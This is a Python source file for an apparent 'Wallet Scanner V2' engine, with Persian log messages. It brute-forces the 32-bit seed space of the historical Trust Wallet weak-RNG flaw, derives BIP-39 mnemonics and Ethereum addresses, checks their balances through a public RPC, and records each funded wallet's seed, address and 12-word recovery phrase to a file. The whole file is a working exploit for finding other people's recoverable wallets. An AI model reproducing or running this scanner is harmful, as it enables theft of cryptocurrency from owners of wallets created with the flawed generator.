"""Scanner engine: background seed-space traversal + on-chain balance audit.

Pipeline per seed (uint32, matching the historical Trust Wallet RNG flaw):
  MT19937(seed) -> random_buffer(16) -> BIP-39 checksum filter ->
  mnemonic/address derivation -> eth_getBalance via public RPC.

Hits (balance > threshold) are appended to funded_wallets.txt and shown in the UI.
"""
from __future__ import annotations

import threading
import time
from collections import deque
from pathlib import Path

from balance import get_balance_wei, wei_to_eth
from wallet_model import checksum_passes, wallet_for_seed

HITS_FILE = Path(__file__).resolve().parent.parent / "funded_wallets.txt"


class Scanner:
    def __init__(self) -> None:
        self._lock = threading.Lock()
        self._thread: threading.Thread | None = None
        self.running = False
        self.stop_event = threading.Event()

        # settings
        self.start_seed = 0
        self.end_seed = 2**32 - 1
        self.duration_sec = 60          # test window; 0 = run until stopped
        self.batch_size = 50            # valid wallets checked per interval
        self.interval_sec = 1.0         # pause between check batches
        self.threshold_eth = 0.0        # min ETH to count as "has funds"

        # state
        self.next_seed = 0
        self.seeds_scanned = 0
        self.wallets_derived = 0
        self.balances_checked = 0
        self.funded: list[dict] = []
        self.errors: int = 0
        self.last_error = ""
        self.started_at: float | None = None
        self.finished_at: float | None = None
        self.logs: deque[str] = deque(maxlen=200)

    # ------------------------------------------------------------------ API
    def configure(self, **kw) -> None:
        with self._lock:
            for k, v in kw.items():
                if hasattr(self, k) and v is not None:
                    setattr(self, k, v)

    def status(self) -> dict:
        with self._lock:
            elapsed = 0.0
            if self.started_at:
                elapsed = (self.finished_at or time.time()) - self.started_at
            return {
                "running": self.running,
                "start_seed": self.start_seed, "end_seed": self.end_seed,
                "next_seed": self.next_seed, "seeds_scanned": self.seeds_scanned,
                "wallets_derived": self.wallets_derived,
                "balances_checked": self.balances_checked,
                "funded_count": len(self.funded),
                "errors": self.errors, "last_error": self.last_error,
                "elapsed_sec": round(elapsed, 1),
                "duration_sec": self.duration_sec,
                "interval_sec": self.interval_sec,
                "batch_size": self.batch_size,
                "threshold_eth": self.threshold_eth,
                "funded": list(self.funded),
                "logs": list(self.logs),
            }

    def start(self) -> bool:
        with self._lock:
            if self.running:
                return False
            self.running = True
            self.stop_event.clear()
            self.finished_at = None
            self.started_at = time.time()
            if self.next_seed < self.start_seed or self.next_seed > self.end_seed:
                self.next_seed = self.start_seed
            self._log(f"شروع پیمایش از seed {self.next_seed} تا {self.end_seed}")
            self._thread = threading.Thread(target=self._run, daemon=True)
            self._thread.start()
            return True

    def stop(self) -> bool:
        with self._lock:
            if not self.running:
                return False
            self.stop_event.set()
            self.running = False
            self.finished_at = time.time()
            self._log("توقف توسط کاربر")
            return True

    def reset(self) -> None:
        with self._lock:
            self.stop_event.set()
            self.running = False
            self.next_seed = self.start_seed
            self.seeds_scanned = self.wallets_derived = self.balances_checked = 0
            self.errors = 0
            self.funded = []
            self.started_at = self.finished_at = None
            self.logs.clear()

    # ------------------------------------------------------------- worker
    def _log(self, msg: str) -> None:
        self.logs.appendleft(f"{time.strftime('%H:%M:%S')} | {msg}")

    def _run(self) -> None:
        deadline = (time.time() + self.duration_sec) if self.duration_sec else None
        try:
            while not self.stop_event.is_set():
                # 1. derive a batch of valid wallets (checksum-passing seeds)
                batch: list[tuple[int, str, str]] = []
                with self._lock:
                    seed = self.next_seed
                while len(batch) < self.batch_size and seed <= self.end_seed:
                    if self.stop_event.is_set():
                        break
                    ok = checksum_passes(seed)
                    with self._lock:
                        self.next_seed = seed + 1
                        self.seeds_scanned += 1
                    if ok:
                        mn, addr = wallet_for_seed(seed)
                        batch.append((seed, mn, addr))
                        with self._lock:
                            self.wallets_derived += 1
                    seed += 1
                if not batch:
                    with self._lock:
                        self._log("پایان محدوده seed ها")
                    break

                # 2. check balances on-chain
                for s, mn, addr in batch:
                    if self.stop_event.is_set():
                        break
                    try:
                        wei = get_balance_wei(addr)
                    except RuntimeError as exc:
                        with self._lock:
                            self.errors += 1
                            self.last_error = str(exc)[:200]
                        continue
                    with self._lock:
                        self.balances_checked += 1
                    if wei_to_eth(wei) >= self.threshold_eth and wei > 0:
                        rec = {"seed": s, "mnemonic": mn, "address": addr,
                               "wei": str(wei), "eth": wei_to_eth(wei),
                               "found_at": time.strftime("%Y-%m-%d %H:%M:%S")}
                        with self._lock:
                            self.funded.append(rec)
                            self._log(f"ولت دارای موجودی! seed={s} {addr[:10]}… "
                                      f"{wei_to_eth(wei):.6f} ETH")
                        self._append_hit(rec)

                if deadline and time.time() >= deadline:
                    with self._lock:
                        self._log("اتمام زمان تست تعیین‌شده")
                    break
                self.stop_event.wait(self.interval_sec)
        finally:
            with self._lock:
                self.running = False
                self.finished_at = time.time()

    @staticmethod
    def _append_hit(rec: dict) -> None:
        header = "# ولت‌های دارای موجودی — یافت‌شده توسط Wallet Scanner V2\n"
        line = (f"{rec['found_at']} | seed={rec['seed']} | {rec['eth']:.18f} ETH | "
                f"{rec['address']}\n12 words: {rec['mnemonic']}\n\n")
        first = not HITS_FILE.exists() or HITS_FILE.stat().st_size == 0
        with HITS_FILE.open("a", encoding="utf-8") as fh:
            if first:
                fh.write(header)
            fh.write(line)
